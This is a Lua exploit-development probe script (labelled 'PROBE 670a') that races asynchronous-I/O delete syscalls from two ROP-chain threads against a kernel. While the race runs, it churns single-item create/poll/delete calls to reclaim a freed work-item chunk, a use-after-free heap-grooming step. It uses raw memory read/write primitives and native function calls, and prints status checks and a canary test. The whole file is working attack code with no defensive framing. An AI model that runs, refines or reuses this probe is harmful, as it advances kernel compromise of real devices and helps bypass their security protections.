-- CRASH_CLASS: HIGH
-- PROBE 670a: 641a plus a single-item create/poll/delete churn in the parent.
-- Single-item creates are the only shape proven safe, and each one allocates
-- exactly the 0x58 work item and 0x30 context the delete frees, so the churn can
-- reclaim a freed chunk inside the window.
print("=== PROBE 670a: AIO RACE VS SINGLE-ITEM CHURN ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local NB=32
local data=memory.alloc(0x2000) local out=memory.alloc(0x40)
for i=0,0x1FFC,4 do wd(N(data)+i,0) end
local sc669=mk(669) local sc664=mk(664) local sc662=mk(662) local sc454=mk(454)
local ids=memory.alloc(NB*2*4)
local CDATA=memory.alloc(0x100)
local COUT=memory.alloc(0x40)
local CID=memory.alloc(8)
local CST=memory.alloc(8)
for i=0,0xFC,4 do wd(N(CDATA)+i,0) end
local made=0
for b=0,NB-1 do
    wd(N(out),0)
    local o,r=pcall(function() return sc669(uint64(0x1001),uint64(N(data)),uint64(2),uint64(1),uint64(N(out))) end)
    local base=rd(N(out))
    if o and N(r)==0 and base and base>0 then
        wd(N(ids)+(2*b)*4, base)
        wd(N(ids)+(2*b+1)*4, base+0x10000)
        made=made+1
    else
        print(string.format("[!] create %d failed r=%s base=%s",b,tostring(o and r or "err"),tostring(base)))
        break
    end
end
print(string.format("[A] blocks=%d",made))
if made<4 then print("[!] too few"); return end
local NI=made*2
local chk=memory.alloc(0x40)
local good=0
for i=0,NI-1 do
    wd(N(chk),0x77777777)
    pcall(function() sc664(U(N(ids)+i*4),uint64(1),uint64(N(chk))) end)
    local st=rd(N(chk))
    if st==3 or st==0x10003 then good=good+1 end
end
print(string.format("[B] polled=%d/%d",good,NI))
if good<NI then print("[!] not ready"); return end
local W=memory.alloc(8)
wq(N(W),uint64(0))
local stA=memory.alloc(NI*4)
local stB=memory.alloc(NI*4)
for i=0,NI*4-1,4 do wd(N(stA)+i,0x77777777) wd(N(stB)+i,0x77777777) end
local function build(stp)
    local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
    c:push_syscall_with_ret(mk(454), U(N(W)), uint64(2), uint64(0))
    for i=0,NI-1 do
        c:push_syscall_with_ret(mk(662), U(N(ids)+i*4), uint64(1), U(N(stp)+i*4))
    end
    return c
end
local ca=build(N(stA))
local cb=build(N(stB))
print("[C] chains built")
local ta=thread:new(ca)
local tb=thread:new(cb)
ta:run(true)
tb:run(true)
for i=1,600000 do local x=i end
wq(N(W),uint64(1))
local ow,rw=pcall(function() return sc454(U(N(W)),uint64(3),uint64(0x7fffffff)) end)
local made,del,ref=0,0,0
for n=1,400 do
    wd(N(COUT),0)
    local o,r=pcall(function() return sc669(U(1),U(N(CDATA)),U(1),U(1),U(N(COUT)),U(0)) end)
    local cid=rd(N(COUT)) or 0
    if o and N(r)==0 and cid>0 then
        made=made+1
        wd(N(CID),cid)
        wd(N(CST),0)
        pcall(function() sc664(U(N(CID)),U(1),U(N(CST)),U(0),U(0),U(0)) end)
        wd(N(CST),0)
        pcall(function() sc662(U(N(CID)),U(1),U(N(CST))) end)
        local s=rd(N(CST))
        if s==0 then del=del+1 else ref=ref+1 end
    end
end
print(string.format("[D] wake rv=%s churn made=%d del=%d refused=%d",tostring(rw or 0),made,del,ref))
ta:join()
tb:join()
print("[E] joined")
local both,za,zb=0,0,0
for i=0,NI-1 do
    local a=rd(N(stA)+i*4) local b=rd(N(stB)+i*4)
    if a==0 then za=za+1 end
    if b==0 then zb=zb+1 end
    if a==0 and b==0 then both=both+1 end
end
print(string.format("[F] A zeros=%d B zeros=%d both=%d of %d",za,zb,both,NI))
-- canary
wd(N(out),0)
local o2,r2=pcall(function() return sc669(uint64(1),uint64(N(data)),uint64(1),uint64(1),uint64(N(out))) end)
local b2=rd(N(out))
local ok2=(o2 and N(r2)==0 and b2 and b2>0)
if ok2 then
    wd(N(chk),0x77777777) wd(N(ids),b2)
    pcall(function() sc664(U(N(ids)),uint64(1),uint64(N(chk))) end)
    local s2=rd(N(chk))
    wd(N(chk),0x77777777)
    pcall(function() sc662(U(N(ids)),uint64(1),uint64(N(chk))) end)
    local s3=rd(N(chk))
    print(string.format("[G] canary poll=%s del=%s",tostring(s2),tostring(s3)))
    ok2=((s2==3 or s2==0x10003) and s3==0)
end
print(string.format("[H] canary ok=%s alive=%d",tostring(ok2),N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] alive")
